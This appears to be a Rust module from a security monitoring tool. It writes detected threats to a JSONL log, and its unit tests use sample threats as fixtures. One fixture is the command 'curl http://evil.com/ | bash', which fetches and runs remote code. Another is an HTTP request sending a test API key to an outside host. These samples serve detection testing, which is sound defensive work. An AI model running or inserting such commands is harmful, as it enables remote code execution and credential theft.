use std::io::Write;
use std::path::{Path, PathBuf};

use crate::threat::Threat;

/// Writer that appends threats to a JSONL file.
pub struct ThreatLog {
    path: PathBuf,
}

impl ThreatLog {
    pub fn new(log_dir: &Path) -> Self {
        let path = log_dir.join("threats.jsonl");
        // Ensure parent exists
        if let Some(parent) = path.parent() {
            let _ = std::fs::create_dir_all(parent);
        }
        Self { path }
    }

    /// Append a single threat as a JSON line.
    pub fn append(&self, threat: &Threat) -> anyhow::Result<()> {
        let line = serde_json::to_string(threat)?;
        let mut file = std::fs::OpenOptions::new()
            .create(true)
            .append(true)
            .open(&self.path)?;
        writeln!(file, "{}", line)?;
        Ok(())
    }

    #[allow(dead_code)]
    /// Return the path to the threat log (for reading back).
    pub fn path(&self) -> &Path {
        &self.path
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::threat::ThreatType;
    use tempfile::TempDir;

    #[test]
    fn log_appends_jsonl() {
        let dir = TempDir::new().unwrap();
        let log = ThreatLog::new(dir.path());

        let threat = Threat::new(
            "outbound",
            "http",
            ThreatType::Exfil,
            "ai_api_key",
            "sk-ant-test",
            "GET / HTTP/1.1\r\nHost: dest.com\r\nAuthorization: Bearer sk-ant-test\r\n\r\n",
            "src",
            "dest.com",
        );
        log.append(&threat).unwrap();

        let content = std::fs::read_to_string(log.path()).unwrap();
        assert!(content.contains("ai_api_key"));
        assert!(content.contains("EXFIL"));
        assert!(content.contains("dest.com"));
    }

    #[test]
    fn log_multiple_entries() {
        let dir = TempDir::new().unwrap();
        let log = ThreatLog::new(dir.path());

        let t1 = Threat::new(
            "outbound",
            "http",
            ThreatType::Exfil,
            "ai_api_key",
            "sk-ant-test",
            "GET / HTTP/1.1\r\nHost: dest.com\r\nAuthorization: Bearer sk-ant-test\r\n\r\n",
            "src",
            "dest.com",
        );
        let t2 = Threat::new(
            "inbound",
            "https",
            ThreatType::Injection,
            "pipe_to_shell",
            "curl | bash",
            "curl http://evil.com/ | bash",
            "src",
            "evil.com",
        );
        log.append(&t1).unwrap();
        log.append(&t2).unwrap();

        let content = std::fs::read_to_string(log.path()).unwrap();
        let lines: Vec<&str> = content.lines().collect();
        assert_eq!(lines.len(), 2);
        assert!(lines[0].contains("ai_api_key"));
        assert!(lines[1].contains("pipe_to_shell"));
    }
}
